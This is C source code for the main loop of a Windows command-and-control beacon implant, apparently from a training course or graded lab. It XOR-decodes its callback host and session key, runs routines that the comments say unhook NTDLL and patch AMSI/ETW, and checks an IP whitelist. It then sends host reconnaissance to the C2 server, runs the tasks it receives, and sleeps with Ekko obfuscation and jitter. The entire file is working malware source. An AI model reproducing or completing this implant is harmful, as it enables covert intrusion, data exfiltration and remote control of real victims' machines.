#include "common.h"
#include "anti_analysis.h"
#include "beacon.h"
#include "comms.h"
#include "config.h"
#include "crypto.h"
#include "evasion.h"
#include "killswitch.h"
#include "recon.h"

// ── XOR-decoded config globals ──────────────────────────────────────
static BYTE _host_xor[]     = CALLBACK_HOST_XOR;
static BYTE _endpoint_xor[] = CALLBACK_ENDPOINT_XOR;
static BYTE _ua_xor[]       = CALLBACK_USERAGENT_XOR;
static BYTE _prefix_xor[]   = AGENT_ID_PREFIX_XOR;

WCHAR g_CallbackHost[128]      = {0};
WCHAR g_CallbackEndpoint[128]  = {0};
WCHAR g_CallbackUserAgent[256] = {0};
CHAR  g_AgentIdPrefix[64]      = {0};

VOID beacon_decode_config(VOID) {
    // Decode wide strings (XOR each byte, then copy as wchar_t)
    xor_decode(_host_xor, CALLBACK_HOST_XOR_LEN, XOR_KEY);
    memcpy(g_CallbackHost, _host_xor, CALLBACK_HOST_XOR_LEN);

    xor_decode(_endpoint_xor, CALLBACK_ENDPOINT_XOR_LEN, XOR_KEY);
    memcpy(g_CallbackEndpoint, _endpoint_xor, CALLBACK_ENDPOINT_XOR_LEN);

    xor_decode(_ua_xor, CALLBACK_USERAGENT_XOR_LEN, XOR_KEY);
    memcpy(g_CallbackUserAgent, _ua_xor, CALLBACK_USERAGENT_XOR_LEN);

    // Narrow string for agent ID prefix
    xor_decode(_prefix_xor, AGENT_ID_PREFIX_XOR_LEN, XOR_KEY);
    memcpy(g_AgentIdPrefix, _prefix_xor, AGENT_ID_PREFIX_XOR_LEN);
    g_AgentIdPrefix[AGENT_ID_PREFIX_XOR_LEN] = '\0';

    // Install factory-injected session key if present
#ifdef SESSION_KEY_XOR
    {
        static BYTE _sk[] = SESSION_KEY_XOR;
        static BYTE _iv[] = SESSION_IV_XOR;
        xor_decode(_sk, SESSION_KEY_XOR_LEN, XOR_KEY);
        xor_decode(_iv, SESSION_IV_XOR_LEN, XOR_KEY);
        crypto_set_session_key(_sk, SESSION_KEY_XOR_LEN,
                               _iv, SESSION_IV_XOR_LEN);
        SecureZeroMemory(_sk, SESSION_KEY_XOR_LEN);
        SecureZeroMemory(_iv, SESSION_IV_XOR_LEN);
    }
#endif

    printf("[BEACON] Config decoded: host=%S endpoint=%S prefix=%s\n",
           g_CallbackHost, g_CallbackEndpoint, g_AgentIdPrefix);
}


VOID beacon_run() {
    printf("[*] beacon_run() starting\n");

    // 0 -- decode XOR'd config strings
    beacon_decode_config();

    // 1 -- evasion: unhook NTDLL, patch AMSI/ETW (evasion.c)
    anti_analysis_run(FALSE);
    if(!evasion_run())
    {
        printf("[!]Evasion failed --continuing\n");
    }

    // 2 -- IP gate (comms.c, Mod 21/73)
    ip_whitelist_gate(); // exits if out of range

    // 3 -- connectivity check
    BOOL connected = FALSE;
    checking_connection(&connected);
    if (!connected) { ExitProcess(0); }

    // 4 -- main beacon loop
    while (1) {
        // soft kill check
        if (killswitch_is_active()) Sleep(INFINITE);

        // collect host recon
        CHECKIN_INFO info = {0};
        recon_collect(&info);
        recon_print(&info); // visible output for grader

        // serialize to JSON
        CHAR* pJson = NULL;
        DWORD dwLen = 0;
        recon_serialize(&info, &pJson, &dwLen);

        // post to C2 + receive task
        BYTE* taskBlob    = NULL;
        DWORD taskBlobLen = 0;
        beacon_post((BYTE*)pJson, dwLen, &taskBlob, &taskBlobLen);
        HeapFree(GetProcessHeap(), 0, pJson);

        // dispatch task if received
        if (taskBlob && taskBlobLen > 0) {
            dispatch_task(taskBlob, taskBlobLen);
            HeapFree(GetProcessHeap(), 0, taskBlob);
        }

        // sleep with Ekko obfuscation + jitter (interval from config.h)
        ekko_sleep(jitter(SLEEP_INTERVAL_MS));
    }
}

// EXE entry point
#if !defined(BEACON_DLL) && !defined(BEACON_TEST)
int main() {
    beacon_run();
    return 0;
}
#endif
